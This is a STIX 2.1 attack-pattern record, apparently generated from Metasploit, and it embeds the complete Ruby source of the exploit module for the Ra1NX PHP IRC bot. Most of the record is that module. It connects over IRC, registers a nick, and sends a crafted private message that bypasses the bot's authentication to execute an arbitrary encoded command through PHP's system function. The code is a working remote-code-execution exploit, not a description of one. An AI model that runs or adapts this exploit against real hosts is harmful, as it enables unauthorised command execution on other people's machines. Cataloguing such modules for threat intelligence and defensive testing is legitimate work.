{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--168e2b5f-17ec-4b6d-ac57-4ecb87e0e56c",
    "created": "2024-08-14T17:06:52.963232Z",
    "modified": "2024-08-14T17:06:52.963236Z",
    "name": "Ra1NX PHP Bot PubCall Authentication Bypass Remote Code Execution",
    "description": " This module allows remote command execution on the PHP IRC bot Ra1NX by using the public call feature in private message to covertly bypass the authentication system. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/misc/ra1nx_pubcall_exec.rb",
            "external_id": "ra1nx_pubcall_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "https://defense.ballastsecurity.net/wiki/index.php/Ra1NX_bot"
        },
        {
            "source_name": "reference",
            "url": "https://defense.ballastsecurity.net/decoding/index.php?hash=69401ac90262f3855c23cd143d7d2ae0"
        },
        {
            "source_name": "reference",
            "url": "http://ddecode.com/phpdecoder/?results=8c6ba611ea2a504da928c6e176a6537b"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Ra1NX PHP Bot PubCall Authentication Bypass Remote Code Execution',\n      'Description'    => %q{\n            This module allows remote command execution on the PHP IRC bot Ra1NX by\n          using the public call feature in private message to covertly bypass the\n          authentication system.\n        },\n      'Author'         =>\n        [\n          'bwall <bwall[at]openbwall.com>' # Ra1NX analysis and Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['OSVDB', '91663'],\n          ['URL', 'https://defense.ballastsecurity.net/wiki/index.php/Ra1NX_bot'],\n          ['URL', 'https://defense.ballastsecurity.net/decoding/index.php?hash=69401ac90262f3855c23cd143d7d2ae0'],\n          ['URL', 'http://ddecode.com/phpdecoder/?results=8c6ba611ea2a504da928c6e176a6537b']\n        ],\n      'Platform'       => %w{ unix win },\n      'Arch'           => ARCH_CMD,\n      'Payload'        =>\n        {\n          'Space'    => 344,\n          'BadChars' => '',\n          'DisableNops' => true,\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd'\n            }\n        },\n      'Targets'  =>\n        [\n          ['Ra1NX / Unix', { 'Platform' => 'unix' } ],\n          ['Ra1NX / Windows', { 'Platform' => 'win' } ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2013-03-24',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        Opt::RPORT(6667),\n        OptString.new('IRC_PASSWORD', [false, 'IRC Connection Password', '']),\n        OptString.new('NICK', [true, 'IRC Nickname', 'msf_user']),\n        OptString.new('RNICK', [true, 'Nickname of Target IRC Bot', 'jhl1']),\n        OptString.new('PHP_EXEC', [true, 'Function used to call payload', 'system'])\n      ])\n  end\n\n  def post_auth?\n    true\n  end\n\n  def connect_irc\n    print_status(\"#{rhost}:#{rport} - Connecting to IRC server...\")\n    connect\n\n    data = \"\"\n    begin\n      read_data = sock.get_once(-1, 1)\n      while not read_data.nil?\n        data << read_data\n        read_data = sock.get_once(-1, 1)\n      end\n    rescue EOFError\n    end\n\n    if data and data =~ /020.*wait/\n      print_good(\"#{rhost}:#{rport} - Connection successful, giving 3 seconds to IRC server to process our connection...\")\n      select(nil, nil, nil, 3)\n    end\n  end\n\n  def check\n    connect_irc\n\n    response = register(sock)\n    if response =~ /463/ or response =~ /464/\n      vprint_error(\"#{rhost}:#{rport} - Connection to the IRC Server not allowed\")\n      return Exploit::CheckCode::Unknown\n    end\n\n    confirm_string = rand_text_alpha(8)\n    response = send_msg(sock, \"PRIVMSG #{datastore['RNICK']} :#{datastore['RNICK']} @msg #{datastore['NICK']} #{confirm_string}\\r\\n\")\n\n    quit(sock)\n    disconnect\n\n    if response =~ /#{confirm_string}/\n      return Exploit::CheckCode::Vulnerable\n    else\n      return Exploit::CheckCode::Safe\n    end\n  end\n\n  def send_msg(sock, data)\n    sock.put(data)\n    data = \"\"\n    begin\n      read_data = sock.get_once(-1, 1)\n      while not read_data.nil?\n        data << read_data\n        read_data = sock.get_once(-1, 1)\n      end\n    rescue EOFError\n    end\n    data\n  end\n\n  def register(sock)\n    msg = \"\"\n\n    if datastore['IRC_PASSWORD'] and not datastore['IRC_PASSWORD'].empty?\n      msg << \"PASS #{datastore['IRC_PASSWORD']}\\r\\n\"\n    end\n\n    if datastore['NICK'].length > 9\n      nick = rand_text_alpha(9)\n      print_error(\"The nick is longer than 9 characters, using #{nick}\")\n    else\n      nick = datastore['NICK']\n    end\n\n    msg << \"NICK #{nick}\\r\\n\"\n    msg << \"USER #{nick} #{Rex::Socket.source_address(rhost)} #{rhost} :#{nick}\\r\\n\"\n\n    response = send_msg(sock,msg)\n    return response\n  end\n\n  def ra1nx_command(sock)\n    encoded = payload.encoded\n    command_msg = \"PRIVMSG #{datastore['RNICK']} :#{datastore['RNICK']} @#{datastore['PHP_EXEC']} #{encoded}\\r\\n\"\n    response = send_msg(sock, command_msg)\n    return response\n  end\n\n  def quit(sock)\n    quit_msg = \"QUIT :bye bye\\r\\n\"\n    sock.put(quit_msg)\n  end\n\n  def exploit\n    connect_irc\n\n    print_status(\"#{rhost}:#{rport} - Registering with the IRC Server...\")\n    response = register(sock)\n    if response =~ /463/ or response =~ /464/\n      print_error(\"#{rhost}:#{rport} - Connection to the IRC Server not allowed\")\n      return\n    end\n\n    print_status(\"#{rhost}:#{rport} - Exploiting the Ra1NX bot...\")\n    ra1nx_command(sock)\n\n    quit(sock)\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-03-24",
    "x_mitre_platforms": [
        "%w{ unix win }"
    ]
}